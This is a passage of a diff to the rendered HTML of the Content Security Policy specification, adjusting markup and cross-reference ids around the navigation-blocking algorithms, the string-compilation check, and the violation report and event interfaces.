     <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element①">Element</a></code> (<var>element</var>), a string (<var>type</var>), and a string (<var>source</var>)
   this algorithm returns "<code>Allowed</code>" if the element is allowed to have inline
   definition of a particular type of behavior (script execution, style
@@ -2750,9 +3156,9 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
      <li data-md>
       <p>Return <var>result</var>.</p>
     </ol>
-    <h4 class="heading settled algorithm" data-algorithm="Should navigation request of type be blocked
-    by Content Security Policy?" data-level="4.2.5" id="should-block-navigation-request"><span class="secno">4.2.5. </span><span class="content"> Should <var>navigation request</var> of <var>type</var> be blocked
-    by Content Security Policy? </span><a class="self-link" href="#should-block-navigation-request"></a></h4>
+    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Should navigation request of type be blocked
+    by Content Security Policy?" data-dfn-type="dfn" data-export data-level="4.2.5" data-lt="Should navigation request of type be blocked by Content Security Policy?" id="should-block-navigation-request"><span class="secno">4.2.5. </span><span class="content"> Should <var>navigation request</var> of <var>type</var> be blocked
+    by Content Security Policy? </span><a class="self-link" href="#should-block-navigation-request" id="ref-for-should-block-navigation-request③"></a></h4>
     <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①④">request</a> (<var>navigation request</var>) and a string (<var>type</var>, either
   "<code>form-submission</code>" or "<code>other</code>"), this algorithm return "<code>Blocked</code>" if the active policy blocks
   the navigation, and "<code>Allowed</code>" otherwise:</p>
@@ -2810,8 +3216,8 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
      <li data-md>
       <p>Return <var>result</var>.</p>
     </ol>
-    <h4 class="heading settled algorithm" data-algorithm="Should navigation response to navigation request of type
-    in target be blocked by Content Security Policy?" data-level="4.2.6" id="should-block-navigation-response"><span class="secno">4.2.6. </span><span class="content"> Should <var>navigation response</var> to <var>navigation request</var> of <var>type</var> in <var>target</var> be blocked by Content Security Policy? </span><a class="self-link" href="#should-block-navigation-response"></a></h4>
+    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Should navigation response to navigation request of type
+    in target be blocked by Content Security Policy?" data-dfn-type="dfn" data-export data-level="4.2.6" data-lt="Should navigation response to navigation request of type in target be blocked by Content Security Policy?" id="should-block-navigation-response"><span class="secno">4.2.6. </span><span class="content"> Should <var>navigation response</var> to <var>navigation request</var> of <var>type</var> in <var>target</var> be blocked by Content Security Policy? </span><a class="self-link" href="#should-block-navigation-response" id="ref-for-should-block-navigation-response②"></a></h4>
     <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①⑤">request</a> (<var>navigation request</var>), a string (<var>type</var>, either
   "<code>form-submission</code>" or "<code>other</code>"), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑦">response</a> <var>navigation
   response</var>, and a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#browsing-context" id="ref-for-browsing-context②">browsing context</a> <var>target</var>, this algorithm
@@ -2873,7 +3279,7 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
   which allows the host environment to block the compilation of strings into
   ECMAScript code. This document defines an implementation of that abstract
   operation thich examines the relevant <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list②⓪">CSP list</a> to determine whether such compilation ought to be blocked.</p>
-    <h4 class="heading settled algorithm" data-algorithm="EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)" data-dfn-type="dfn" data-level="4.3.1" data-lt="EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)" data-noexport id="can-compile-strings"><span class="secno">4.3.1. </span><span class="content"> EnsureCSPDoesNotBlockStringCompilation(<var>callerRealm</var>, <var>calleeRealm</var>, <var>source</var>) </span><a class="self-link" href="#can-compile-strings"></a></h4>
+    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)" data-dfn-type="dfn" data-export data-level="4.3.1" data-lt="EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)" id="can-compile-strings"><span class="secno">4.3.1. </span><span class="content"> EnsureCSPDoesNotBlockStringCompilation(<var>callerRealm</var>, <var>calleeRealm</var>, <var>source</var>) </span><a class="self-link" href="#can-compile-strings" id="ref-for-can-compile-strings"></a></h4>
     <p>Given two <a data-link-type="dfn" href="https://tc39.github.io/ecma262#realm" id="ref-for-realm">realms</a> (<var>callerRealm</var> and <var>calleeRealm</var>), and a string (<var>source</var>), this algorithm
   returns normally if string compilation is allowed, and throws an "<code>EvalError</code>" if not:</p>
     <ol>
@@ -2930,7 +3336,7 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
     <p><a data-link-type="dfn" href="#csp-violation-report" id="ref-for-csp-violation-report">csp violation reports</a> have the <a data-link-type="dfn" href="https://w3c.github.io/reporting/#report-type" id="ref-for-report-type">report type</a> "csp-violation".</p>
     <p><a data-link-type="dfn" href="#csp-violation-report" id="ref-for-csp-violation-report①">csp violation reports</a> are <a data-link-type="dfn" href="https://w3c.github.io/reporting/#visible-to-reportingobservers" id="ref-for-visible-to-reportingobservers">visible to <code>ReportingObserver</code>s</a>. </p>
 <pre class="idl highlight def">[<a class="idl-code" data-link-type="extended-attribute" href="https://heycam.github.io/webidl/#Exposed" id="ref-for-Exposed"><c- g>Exposed</c-></a>=<c- n>Window</c->]
-<c- b>interface</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="interface" data-export id="cspviolationreportbody"><code><c- g>CSPViolationReportBody</c-></code></dfn> : <a class="n" data-link-type="idl-name" href="https://w3c.github.io/reporting/#reportbody" id="ref-for-reportbody"><c- n>ReportBody</c-></a> {
+<c- b>interface</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="interface" data-export id="cspviolationreportbody"><code><c- g>CSPViolationReportBody</c-></code></dfn> : <a data-link-type="idl-name" href="https://w3c.github.io/reporting/#reportbody" id="ref-for-reportbody"><c- n>ReportBody</c-></a> {
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString"><c- b>USVString</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-cspviolationreportbody-documenturl"><code><c- g>documentURL</c-></code></dfn>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString①"><c- b>USVString</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="USVString?" id="dom-cspviolationreportbody-referrer"><code><c- g>referrer</c-></code></dfn>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString②"><c- b>USVString</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="USVString?" id="dom-cspviolationreportbody-blockedurl"><code><c- g>blockedURL</c-></code></dfn>;
@@ -2938,7 +3344,7 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString" id="ref-for-idl-DOMString①"><c- b>DOMString</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-cspviolationreportbody-originalpolicy"><code><c- g>originalPolicy</c-></code></dfn>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString③"><c- b>USVString</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="USVString?" id="dom-cspviolationreportbody-sourcefile"><code><c- g>sourceFile</c-></code></dfn>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString" id="ref-for-idl-DOMString②"><c- b>DOMString</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="DOMString?" id="dom-cspviolationreportbody-sample"><code><c- g>sample</c-></code></dfn>;
-  <c- b>readonly</c-> <c- b>attribute</c-> <a class="n" data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition" id="ref-for-enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="SecurityPolicyViolationEventDisposition" id="dom-cspviolationreportbody-disposition"><code><c- g>disposition</c-></code></dfn>;
+  <c- b>readonly</c-> <c- b>attribute</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition" id="ref-for-enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="SecurityPolicyViolationEventDisposition" id="dom-cspviolationreportbody-disposition"><code><c- g>disposition</c-></code></dfn>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-short" id="ref-for-idl-unsigned-short"><c- b>unsigned</c-> <c- b>short</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="unsigned short" id="dom-cspviolationreportbody-statuscode"><code><c- g>statusCode</c-></code></dfn>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long" id="ref-for-idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="unsigned long?" id="dom-cspviolationreportbody-linenumber"><code><c- g>lineNumber</c-></code></dfn>;
   <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long" id="ref-for-idl-unsigned-long①"><c- b>unsigned</c-> <c- b>long</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="unsigned long?" id="dom-cspviolationreportbody-columnnumber"><code><c- g>columnNumber</c-></code></dfn>;
@@ -2950,8 +3356,8 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
 };
 
 [<a class="idl-code" data-link-type="extended-attribute" href="https://heycam.github.io/webidl/#Exposed" id="ref-for-Exposed①"><c- g>Exposed</c-></a>=(<c- n>Window</c->,<c- n>Worker</c->)]
-<c- b>interface</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="interface" data-export id="securitypolicyviolationevent"><code><c- g>SecurityPolicyViolationEvent</c-></code></dfn> : <a class="n" data-link-type="idl-name" href="https://dom.spec.whatwg.org/#event" id="ref-for-event"><c- n>Event</c-></a> {
-    <dfn class="idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="constructor" data-export data-lt="SecurityPolicyViolationEvent(type, eventInitDict)|constructor(type, eventInitDict)|SecurityPolicyViolationEvent(type)|constructor(type)" id="dom-securitypolicyviolationevent-securitypolicyviolationevent"><code><c- g>constructor</c-></code><a class="self-link" href="#dom-securitypolicyviolationevent-securitypolicyviolationevent"></a></dfn>(<a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString" id="ref-for-idl-DOMString③"><c- b>DOMString</c-></a> <dfn class="idl-code" data-dfn-for="SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type, eventInitDict), SecurityPolicyViolationEvent/constructor(type, eventInitDict), SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type), SecurityPolicyViolationEvent/constructor(type)" data-dfn-type="argument" data-export id="dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type"><code><c- g>type</c-></code><a class="self-link" href="#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type"></a></dfn>, <c- b>optional</c-> <a class="n" data-link-type="idl-name" href="#dictdef-securitypolicyviolationeventinit" id="ref-for-dictdef-securitypolicyviolationeventinit"><c- n>SecurityPolicyViolationEventInit</c-></a> <dfn class="idl-code" data-dfn-for="SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type, eventInitDict), SecurityPolicyViolationEvent/constructor(type, eventInitDict), SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type), SecurityPolicyViolationEvent/constructor(type)" data-dfn-type="argument" data-export id="dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict"><code><c- g>eventInitDict</c-></code><a class="self-link" href="#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict"></a></dfn> = {});
+<c- b>interface</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="interface" data-export id="securitypolicyviolationevent"><code><c- g>SecurityPolicyViolationEvent</c-></code></dfn> : <a data-link-type="idl-name" href="https://dom.spec.whatwg.org/#event" id="ref-for-event"><c- n>Event</c-></a> {
+    <dfn class="idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="constructor" data-export data-lt="SecurityPolicyViolationEvent(type, eventInitDict)|constructor(type, eventInitDict)|SecurityPolicyViolationEvent(type)|constructor(type)" id="dom-securitypolicyviolationevent-securitypolicyviolationevent"><code><c- g>constructor</c-></code><a class="self-link" href="#dom-securitypolicyviolationevent-securitypolicyviolationevent"></a></dfn>(<a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString" id="ref-for-idl-DOMString③"><c- b>DOMString</c-></a> <dfn class="idl-code" data-dfn-for="SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type, eventInitDict), SecurityPolicyViolationEvent/constructor(type, eventInitDict), SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type), SecurityPolicyViolationEvent/constructor(type)" data-dfn-type="argument" data-export id="dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type"><code><c- g>type</c-></code><a class="self-link" href="#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type"></a></dfn>, <c- b>optional</c-> <a data-link-type="idl-name" href="#dictdef-securitypolicyviolationeventinit" id="ref-for-dictdef-securitypolicyviolationeventinit"><c- n>SecurityPolicyViolationEventInit</c-></a> <dfn class="idl-code" data-dfn-for="SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type, eventInitDict), SecurityPolicyViolationEvent/constructor(type, eventInitDict), SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type), SecurityPolicyViolationEvent/constructor(type)" data-dfn-type="argument" data-export id="dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict"><code><c- g>eventInitDict</c-></code><a class="self-link" href="#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict"></a></dfn> = {});
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString④"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-securitypolicyviolationevent-documenturl"><code><c- g>documentURL</c-></code></dfn>;
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString⑤"><c- b>USVString</c-></a>      <a class="idl-code" data-link-type="attribute" data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-documenturi" id="ref-for-dom-securitypolicyviolationevent-documenturi"><c- g>documentURI</c-></a>; // historical alias of documentURL
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString⑥"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-securitypolicyviolationevent-referrer"><code><c- g>referrer</c-></code></dfn>;
@@ -2962,7 +3368,7 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString" id="ref-for-idl-DOMString⑥"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-securitypolicyviolationevent-originalpolicy"><code><c- g>originalPolicy</c-></code></dfn>;
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString⑨"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-securitypolicyviolationevent-sourcefile"><code><c- g>sourceFile</c-></code></dfn>;
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString" id="ref-for-idl-DOMString⑦"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-securitypolicyviolationevent-sample"><code><c- g>sample</c-></code></dfn>;
-    <c- b>readonly</c->    <c- b>attribute</c-> <a class="n" data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition" id="ref-for-enumdef-securitypolicyviolationeventdisposition①"><c- n>SecurityPolicyViolationEventDisposition</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="SecurityPolicyViolationEventDisposition" id="dom-securitypolicyviolationevent-disposition"><code><c- g>disposition</c-></code></dfn>;
+    <c- b>readonly</c->    <c- b>attribute</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition" id="ref-for-enumdef-securitypolicyviolationeventdisposition①"><c- n>SecurityPolicyViolationEventDisposition</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="SecurityPolicyViolationEventDisposition" id="dom-securitypolicyviolationevent-disposition"><code><c- g>disposition</c-></code></dfn>;
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-short" id="ref-for-idl-unsigned-short①"><c- b>unsigned</c-> <c- b>short</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="unsigned short" id="dom-securitypolicyviolationevent-statuscode"><code><c- g>statusCode</c-></code></dfn>;
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long" id="ref-for-idl-unsigned-long②"><c- b>unsigned</c-> <c- b>long</c-></a>  <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="unsigned long" id="dom-securitypolicyviolationevent-lineno"><code><c- g>lineno</c-></code></dfn>;
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long" id="ref-for-idl-unsigned-long③"><c- b>unsigned</c-> <c- b>long</c-></a>  <a class="idl-code" data-link-type="attribute" data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-linenumber" id="ref-for-dom-securitypolicyviolationevent-linenumber"><c- g>lineNumber</c-></a>; // historical alias of lineno
@@ -2970,7 +3376,7 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
     <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long" id="ref-for-idl-unsigned-long⑤"><c- b>unsigned</c-> <c- b>long</c-></a>  <a class="idl-code" data-link-type="attribute" data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-columnnumber" id="ref-for-dom-securitypolicyviolationevent-columnnumber"><c- g>columnNumber</c-></a>; // historical alias of colno
 };
 
-<c- b>dictionary</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="dictionary" data-export id="dictdef-securitypolicyviolationeventinit"><code><c- g>SecurityPolicyViolationEventInit</c-></code></dfn> : <a class="n" data-link-type="idl-name" href="https://dom.spec.whatwg.org/#dictdef-eventinit" id="ref-for-dictdef-eventinit"><c- n>EventInit</c-></a> {
+<c- b>dictionary</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="dictionary" data-export id="dictdef-securitypolicyviolationeventinit"><code><c- g>SecurityPolicyViolationEventInit</c-></code></dfn> : <a data-link-type="idl-name" href="https://dom.spec.whatwg.org/#dictdef-eventinit" id="ref-for-dictdef-eventinit"><c- n>EventInit</c-></a> {
     <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString①⓪"><c- b>USVString</c-></a>      <dfn class="idl-code" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="USVString      " id="dom-securitypolicyviolationeventinit-documenturl"><code><c- g>documentURL</c-></code><a class="self-link" href="#dom-securitypolicyviolationeventinit-documenturl"></a></dfn>;
              <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString①①"><c- b>USVString</c-></a>      <dfn class="idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="USVString      " id="dom-securitypolicyviolationeventinit-referrer"><code><c- g>referrer</c-></code><a class="self-link" href="#dom-securitypolicyviolationeventinit-referrer"></a></dfn> = "";
              <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString①②"><c- b>USVString</c-></a>      <dfn class="idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="USVString      " id="dom-securitypolicyviolationeventinit-blockedurl"><code><c- g>blockedURL</c-></code><a class="self-link" href="#dom-securitypolicyviolationeventinit-blockedurl"></a></dfn> = "";
@@ -2978,7 +3384,7 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
     <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString" id="ref-for-idl-DOMString⑨"><c- b>DOMString</c-></a>      <dfn class="idl-code" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="DOMString      " id="dom-securitypolicyviolationeventinit-originalpolicy"><code><c- g>originalPolicy</c-></code><a class="self-link" href="#dom-securitypolicyviolationeventinit-originalpolicy"></a></dfn>;
              <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString①③"><c- b>USVString</c-></a>      <dfn class="idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="USVString      " id="dom-securitypolicyviolationeventinit-sourcefile"><code><c- g>sourceFile</c-></code><a class="self-link" href="#dom-securitypolicyviolationeventinit-sourcefile"></a></dfn> = "";
              <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString" id="ref-for-idl-DOMString①⓪"><c- b>DOMString</c-></a>      <dfn class="idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="DOMString      " id="dom-securitypolicyviolationeventinit-sample"><code><c- g>sample</c-></code><a class="self-link" href="#dom-securitypolicyviolationeventinit-sample"></a></dfn> = "";
-    <c- b>required</c-> <a class="n" data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition" id="ref-for-enumdef-securitypolicyviolationeventdisposition②"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <dfn class="idl-code" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="SecurityPolicyViolationEventDisposition " id="dom-securitypolicyviolationeventinit-disposition"><code><c- g>disposition</c-></code><a class="self-link" href="#dom-securitypolicyviolationeventinit-disposition"></a></dfn>;
+    <c- b>required</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition" id="ref-for-enumdef-securitypolicyviolationeventdisposition②"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <dfn class="idl-code" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="SecurityPolicyViolationEventDisposition " id="dom-securitypolicyviolationeventinit-disposition"><code><c- g>disposition</c-></code><a class="self-link" href="#dom-securitypolicyviolationeventinit-disposition"></a></dfn>;
     <c- b>required</c-> <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-short" id="ref-for-idl-unsigned-short②"><c- b>unsigned</c-> <c- b>short</c-></a> <dfn class="idl-code" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="unsigned short " id="dom-securitypolicyviolationeventinit-statuscode"><code><c- g>statusCode</c-></code><a class="self-link" href="#dom-securitypolicyviolationeventinit-statuscode"></a></dfn>;
              <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long" id="ref-for-idl-unsigned-long⑥"><c- b>unsigned</c-> <c- b>long</c-></a>  <dfn class="idl-code" data-default="0" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="unsigned long  " id="dom-securitypolicyviolationeventinit-lineno"><code><c- g>lineno</c-></code><a class="self-link" href="#dom-securitypolicyviolationeventinit-lineno"></a></dfn> = 0;
              <a class="idl-code" data-link-type="interface" href="https://heycam.github.io/webidl/#idl-unsigned-long" id="ref-for-idl-unsigned-long⑦"><c- b>unsigned</c-> <c- b>long</c-></a>  <dfn class="idl-code" data-default="0" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="unsigned long  " id="dom-securitypolicyviolationeventinit-colno"><code><c- g>colno</c-></code><a class="self-link" href="#dom-securitypolicyviolationeventinit-colno"></a></dfn> = 0;
@@ -3167,7 +3573,7 @@ ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.
              <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-url" id="ref-for-concept-request-url⑤">url</a>
              <dd data-md>
               <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-url" id="ref-for-violation-url③">url</a></p>
-             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-origin" id="ref-for-concept-request-origin">origin</a>
+             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-origin" id="ref-for-concept-request-origin①">origin</a>
              <dd data-md>
               <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-global-object" id="ref-for-violation-global-object⑥">global object</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object" id="ref-for-relevant-settings-object">relevant settings
   object</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin" id="ref-for-concept-settings-object-origin①">origin</a></p>
@@ -3882,7 +4288,7 @@ directive-value = <a data-link-type="grammar" href="#grammardef-serialized-sourc
      <li data-md>
       <p>Script <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②⑧">responses</a> MUST pass through <a href="#should-block-response">§ 4.1.4 Should response to request be blocked by Content Security Policy?</a>.</p>
      <li data-md>
-      <p>Inline <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script⑤">script</a></code> blocks MUST pass through <a href="#should-block-inline">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a>. Their
+      <p>Inline <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script⑤">script</a></code> blocks MUST pass through <a href="#should-block-inline" id="ref-for-should-block-inline④">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a>. Their
   behavior will be blocked unless every policy allows inline script, either
   implicitly by not specifying a <code>script-src</code> (or <code>default-src</code>) directive,
   or explicitly, by specifying "<code>unsafe-inline</code>", a <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source②">nonce-source</a> or a <a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source②">hash-source</a> that matches
@@ -4042,7 +4448,7 @@ directive-value = <a data-link-type="grammar" href="#grammardef-serialized-sourc
        <li data-md>
